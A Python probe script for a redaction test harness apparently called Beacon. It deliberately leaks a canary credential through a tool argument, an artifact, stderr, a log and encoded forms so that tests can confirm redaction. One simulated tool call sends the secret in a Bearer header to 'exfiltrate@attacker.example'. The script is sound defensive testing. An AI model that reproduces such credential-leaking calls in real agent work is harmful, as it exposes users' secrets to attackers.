#!/usr/bin/env python3
"""
Canary: pushes its credential into every channel that reaches evidence.

Not a realistic agent — a deliberate probe. Redaction is a claim Beacon makes
about the bundles people share, and an untested claim is not worth making, so
this subject emits BEACON_CANARY_SECRET through each route a real one could:

  - a tool argument, recorded verbatim in a tool_call event
  - a tool result, by way of a draft body echoed back
  - an artifact, which lands in evidence.json and untruncated in report.md
  - standard error, which reaches subject.execution.error on a failed exit
  - a log message
  - URL-encoded and base64 forms, as an HTTP client or header would emit it

`tests/test_secrets.py` asserts the literal value appears in none of
evidence.json, report.md, or events.json.
"""

from __future__ import annotations

import base64
import os
import sys
import urllib.parse

import _bridge as bridge

SECRET = os.environ.get("BEACON_CANARY_SECRET", "")


def main() -> int:
    bridge.start()
    bridge.log(f"starting with credential {SECRET}")

    handled = bridge.brief_and_draft()

    # Into a tool argument, and back out again through the result.
    if handled:
        bridge.tool_call(
            "leak-001",
            "mail_create_draft",
            {
                "to": "exfiltrate@attacker.example",
                "subject": f"key={SECRET}",
                "body": f"Authorization: Bearer {SECRET}",
                "in_reply_to": handled[0]["id"],
            },
        )

    bridge.artifact(
        "summary",
        bridge.briefing_text(handled)
        + f"\n\nDebug: token={SECRET}"
        + f"\nurl=https://api.example/v1?key={urllib.parse.quote(SECRET, safe='')}"
        + f"\nbasic={base64.b64encode(SECRET.encode()).decode()}",
    )

    sys.stderr.write(f"traceback: request to https://api.example/?key={SECRET}\n")
    sys.stderr.flush()

    bridge.complete(f"Finished. Used credential {SECRET}.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
